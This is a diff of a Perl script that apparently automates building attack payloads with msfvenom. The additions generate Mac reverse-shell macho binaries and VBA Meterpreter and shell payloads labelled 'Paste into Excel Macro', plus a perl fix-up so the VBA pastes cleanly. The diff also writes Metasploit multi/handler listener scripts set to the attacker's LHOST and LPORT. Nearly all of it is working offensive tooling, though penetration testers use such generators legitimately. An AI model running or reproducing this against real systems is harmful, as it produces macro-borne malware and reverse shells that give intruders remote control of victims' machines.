@@ -84,6 +84,8 @@ TCPNOENC
   $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter vba  (Paste into Excel Macro): $cmd\n";
   `$cmd`;
+  `perl -p -i -e 's/, _.*\n/, /g' $targetFolder/$scriptName`;
+  
 
   $scriptNum ="005";
   $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedCustomTemplate-32.c";
@@ -139,6 +141,7 @@ TCPNOENC
   $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder  > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter vba encoded  (Paste into Excel Macro): $cmd\n";
   `$cmd`;
+  `perl -p -i -e 's/, _.*\n/, /g' $targetFolder/$scriptName`;
 
   $scriptNum ="015";
   $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedCustomTemplate-32enc.c";
@@ -213,6 +216,7 @@ TCPSTAGELESS32
   $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-32Bbit Meterpreter vba, no encoding  (Paste into Excel Macro): $cmd\n";
   `$cmd`;
+  `perl -p -i -e 's/, _.*\n/, /g' $targetFolder/$scriptName`;
 
   $scriptNum ="065";
   $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessCustomTemplate-32.c";
@@ -263,6 +267,7 @@ TCPSTAGELESS32
   $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder  > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-32Bit Stageless Meterpreter vba, encoded  (Paste into Excel Macro): $cmd\n";
   `$cmd`;
+  `perl -p -i -e 's/, _.*\n/, /g' $targetFolder/$scriptName`;
 
   $scriptNum ="075";
   $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessCustomTemplate-32enc.c";
@@ -329,6 +334,7 @@ TCPNOENC64
   $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-64bit Staged Meterpreter vba, no encoding  (Paste into Excel Macro): $cmd\n";
   `$cmd`;
+  `perl -p -i -e 's/, _.*\n/, /g' $targetFolder/$scriptName`;
 
   $scriptNum ="105";
   $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedCustomTemplate-32.c";
@@ -377,6 +383,7 @@ TCPNOENC64
   $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-64Bit staged Meterpreter vba, encoded  (Paste into Excel Macro): $cmd\n";
   `$cmd`;
+  `perl -p -i -e 's/, _.*\n/, /g' $targetFolder/$scriptName`;
 
   $scriptNum ="115";
   $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedCustomTemplate-64enc.c";
@@ -458,6 +465,7 @@ TCPSTAGELESS64
   $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-Bit Stageless Meterpreter vba, no encoding  (Paste into Excel Macro): $cmd\n";
   `$cmd`;
+  `perl -p -i -e 's/, _.*\n/, /g' $targetFolder/$scriptName`;
 
   $scriptNum ="165";
   $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessCustomTemplate-64.c";
@@ -506,6 +514,7 @@ TCPSTAGELESS64
   $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-64Bit Stageless Meterpreter vba, encoded  (Paste into Excel Macro): $cmd\n";
   `$cmd`;
+  `perl -p -i -e 's/, _.*\n/, /g' $targetFolder/$scriptName`;
 
   $scriptNum ="175";
   $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessCustomTemplate-64enc.c";
@@ -595,7 +604,7 @@ PYRTCP
 
   ###################
   ##
-  ##  MAC
+  ##  Mac 32 bit
   ##
   ##################
 
@@ -605,7 +614,7 @@ PYRTCP
   $payload = "osx/x86/shell_reverse_tcp";
 
   $scriptNum="400";
-  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-MacShellReverseTCP.rc");
+  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-MacShellReverseTCP-32.rc");
 print $OUTFILE <<MACSHELL1;
 use multi/handler
 set payload $payload
@@ -618,10 +627,56 @@ MACSHELL1
   close $OUTFILE;
 
   $scriptNum ="401";
-  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-shell.macho";
+  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-shell-32.macho";
   $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f macho > $targetFolder/$scriptName";
-  print "\n\n*** ${scriptNum}-Meterpreter mac: $cmd\n";
+  print "\n\n*** ${scriptNum}-32 Bit Shell Mac: $cmd\n";
   `$cmd`;
+
+  $scriptNum ="402";
+  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-MacShell-32.vba";
+  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/$scriptName";
+  print "\n\n*** ${scriptNum}-32Bit Shell vba  (Paste into Excel Macro): $cmd\n";
+  `$cmd`;
+  `perl -p -i -e 's/, _.*\n/, /g' $targetFolder/$scriptName`;
+
+ ###################
+  ##
+  ##  Mac 64 bit
+  ##
+  ##################
+
+
+  $platform_arch = "--platform OSX -a x86_64";
+  $encoder = '-e generic/none -b "\x00"';
+  $payload = "osx/x64/shell_reverse_tcp";
+
+  $scriptNum="450";
+  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-MacShellReverseTCP-64.rc");
+print $OUTFILE <<MACSHELL1;
+use multi/handler
+set payload $payload
+set LHOST $LHOST
+set LPORT $LPORT
+set ExitOnSession false
+set EnableStageEncoding true
+exploit -j
+MACSHELL1
+  close $OUTFILE;
+
+  $scriptNum ="451";
+  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-shell-64.macho";
+  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f macho > $targetFolder/$scriptName";
+  print "\n\n*** ${scriptNum}-64Bit Shell mac: $cmd\n";
+  `$cmd`;
+
+  $scriptNum ="452";
+  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-MacShell-64.vba";
+  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/$scriptName";
+  print "\n\n*** ${scriptNum}-64Bit Staged Meterpreter vba  (Paste into Excel Macro): $cmd\n";
+  `$cmd`;
+  `perl -p -i -e 's/, _.*\n/, /g' $targetFolder/$scriptName`;
+
+
 
 
 
